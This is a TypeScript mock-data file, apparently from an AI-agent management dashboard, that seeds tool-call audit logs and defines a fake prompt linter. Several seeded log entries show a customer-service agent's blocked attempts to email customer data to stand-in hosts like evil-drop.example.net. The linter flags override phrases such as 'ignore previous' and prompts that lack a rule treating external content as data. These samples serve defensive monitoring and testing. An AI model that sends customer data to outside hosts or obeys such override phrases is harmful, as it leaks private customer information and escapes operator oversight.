import { mockDb } from '../db'
import type { ToolCallLog } from '../../types/tools'
import type { PromptVersion, StudioConfig } from '../../types/studio'
import { DAY, HOUR, MIN } from '../biz/rng'
import { accessOf, collections } from './knowledgeData'
import { agentIdOf, grants, iso, NOW, R } from './toolsData'
import { namespaces } from './memoryData'

let seq = 0
export const toolLogs: ToolCallLog[] = []
export const addLog = (l: Omit<ToolCallLog, 'id'>): ToolCallLog => { const x = { ...l, id: `tc${++seq}` }; toolLogs.unshift(x); return x }

// 3 ngày nhật ký: phần lớn ALLOWED, vài lời gọi bị từ chối (CSKH bị dẫn tới miền lạ nhiều lần), vài lời cần duyệt.
const SAMPLE: Record<string, () => Record<string, unknown>> = {
  file_read: () => ({ path: '/workspace/data.csv' }), file_write: () => ({ path: '/workspace/out/ket-qua.md', bytes: R.int(200, 9000) }), web_search: () => ({ query: 'xu hướng video ngắn' }),
  web_fetch: () => ({ url: 'https://youtube.com/watch?v=abc' }), kb_search: () => ({ query: 'chính sách hoàn tiền' }), email_read: () => ({ folder: 'INBOX', limit: 10 }),
  email_send: () => ({ to: 'khach@acme.com', subject: 'Báo giá' }), social_post: () => ({ channel: 'Kênh YouTube chính', title: 'Video mới' }), sheet_update: () => ({ sheetId: 'sheet-chi-phi', range: 'A2:H2' }),
  calendar_create: () => ({ title: 'Họp tuần' }), file_delete: () => ({ path: '/storage/tmp/cu.mp4' }), payment_transfer: () => ({ payee: 'Công ty ABC', amountUsd: 40 }),
}
for (let i = 0; i < 120; i++) {
  const g = grants[R.int(0, grants.length - 1)]
  addLog({ at: iso(NOW - i * 33 * MIN - R.int(0, 20) * MIN), agentId: g.agentId, toolId: g.toolId, decision: 'ALLOWED', reason: 'Nằm trong phạm vi được cấp', taskId: String(5000 + R.int(1, 240)), args: SAMPLE[g.toolId]?.() ?? {}, tainted: g.toolId === 'email_send' && i % 4 === 0 })
}
const cskh = agentIdOf('CSKH')
for (let i = 0; i < 6; i++) addLog({ at: iso(NOW - (2 + i * 5) * HOUR), agentId: cskh, toolId: 'email_send', decision: 'DENIED', reason: 'Chưa khai báo miền nhận nào được phép', taskId: String(5300 + i), args: { to: `thu${i}@evil-${i % 2 ? 'mail' : 'drop'}.example.net`, subject: 'Gửi lại dữ liệu khách hàng' }, tainted: true })
addLog({ at: iso(NOW - DAY), agentId: agentIdOf('Frontend'), toolId: 'web_fetch', decision: 'DENIED', reason: 'Agent chưa được cấp công cụ này', taskId: '5311', args: { url: 'https://example.com' }, tainted: false })
addLog({ at: iso(NOW - 20 * HOUR), agentId: agentIdOf('Thủ quỹ'), toolId: 'payment_transfer', decision: 'DENIED', reason: 'Chưa bật cờ xác nhận ở trang quản trị', taskId: '5312', args: { payee: 'Công ty ABC', amountUsd: 40 }, tainted: false })
addLog({ at: iso(NOW - 6 * HOUR), agentId: agentIdOf('Lên lịch đăng'), toolId: 'social_post', decision: 'NEEDS_APPROVAL', reason: 'Quyền này được đặt "luôn yêu cầu duyệt"', taskId: '5313', args: { channel: 'Kênh YouTube chính', title: 'Khuyến mãi' }, tainted: false })
addLog({ at: iso(NOW - 4 * HOUR), agentId: cskh, toolId: 'email_send', decision: 'NEEDS_APPROVAL', reason: 'Tam giác rủi ro: gửi ra ngoài sau khi đọc nội dung ngoài phải chờ duyệt', taskId: '5314', args: { to: 'khach@acme.com', subject: 'Trả lời khiếu nại' }, tainted: true })
toolLogs.sort((a, b) => Date.parse(b.at) - Date.parse(a.at))

export function logPage(q: URLSearchParams) {
  const rows = toolLogs.filter((l) => (!q.get('agentId') || l.agentId === q.get('agentId')) && (!q.get('toolId') || l.toolId === q.get('toolId')) && (!q.get('decision') || l.decision === q.get('decision')) && (!q.get('denied') || l.decision !== 'ALLOWED'))
  const size = Number(q.get('limit') ?? 40), at = Number(q.get('cursor') ?? 0)
  return { items: rows.slice(at, at + size), nextCursor: at + size < rows.length ? String(at + size) : null }
}

// ---- Agent Studio ----
export const studioConfigs = new Map<string, StudioConfig>()
export function studioOf(agentId: string): StudioConfig {
  let c = studioConfigs.get(agentId)
  if (!c) {
    const hasMemory = namespaces.some((n) => n.agentId === agentId)
    c = {
      agentId, templateId: null, templateVersion: null, latestTemplateVersion: null,
      memoryPolicy: { enabled: hasMemory, autoLoad: 5, autoSummarize: false, requireReview: true },
      collections: [],
      namespaces: namespaces.filter((n) => n.agentId === agentId).map((n) => ({ namespaceId: n.id, access: 'WRITE' as const })),
      dailyBudgetMicro: null,
    }
    if (agentId === agentIdOf('Sales')) Object.assign(c, { templateId: 'tpl14', templateVersion: 2, latestTemplateVersion: 3 })
    studioConfigs.set(agentId, c)
  }
  c.collections = collections.map((col) => ({ collectionId: col.id, access: accessOf(col, agentId) })) // luôn suy từ ACL của bộ sưu tập
  return c
}

export const promptVersions = new Map<string, PromptVersion[]>()
export function versionsOf(agentId: string): PromptVersion[] {
  let v = promptVersions.get(agentId)
  if (!v) {
    const a = mockDb.agents.find((x) => x.id === agentId)
    const cur = a?.systemPrompt ?? ''
    v = [
      { id: `${agentId}-v3`, agentId, version: 3, prompt: cur, note: 'Bản khởi tạo', author: 'Chủ', createdAt: iso(NOW - 2 * DAY) },
      { id: `${agentId}-v2`, agentId, version: 2, prompt: `${cur}\nLuôn trả lời ngắn gọn.`, note: 'Thêm yêu cầu ngắn gọn', author: 'Chủ', createdAt: iso(NOW - 9 * DAY) },
      { id: `${agentId}-v1`, agentId, version: 1, prompt: cur.split(' thuộc')[0] + '.', note: 'Bản đầu', author: 'Chủ', createdAt: iso(NOW - 30 * DAY) },
    ]
    promptVersions.set(agentId, v)
  }
  return v
}

/** Linter giả: cảnh báo theo dòng (BE thật có PromptLinter) */
export function lint(prompt: string) {
  const issues = prompt.split('\n').flatMap((text, i) => {
    const out: { line: number; severity: 'info' | 'warning' | 'error'; code: string; message: string }[] = []
    if (/bỏ qua (mọi|tất cả) (quy tắc|hướng dẫn)|ignore (all|previous)/i.test(text)) out.push({ line: i + 1, severity: 'error', code: 'INJECTION_PHRASE', message: 'Câu này giống chỉ thị bỏ qua quy tắc; bỏ đi.' })
    if (/(api[_-]?key|mật khẩu|password|token)\s*[:=]\s*\S{6,}/i.test(text)) out.push({ line: i + 1, severity: 'error', code: 'SECRET_IN_PROMPT', message: 'Prompt chứa bí mật; hãy dùng mục Bí mật.' })
    if (text.length > 400) out.push({ line: i + 1, severity: 'warning', code: 'LONG_LINE', message: 'Dòng quá dài, khó đọc; chia nhỏ.' })
    return out
  })
  if (!/an toàn|không tin|dữ liệu, không phải chỉ thị/i.test(prompt)) issues.push({ line: 1, severity: 'warning', code: 'NO_SAFETY_SECTION', message: 'Thiếu phần An toàn (nội dung bên ngoài chỉ là dữ liệu).' })
  return { issues, tokenEstimate: Math.ceil(prompt.length / 3.5) }
}
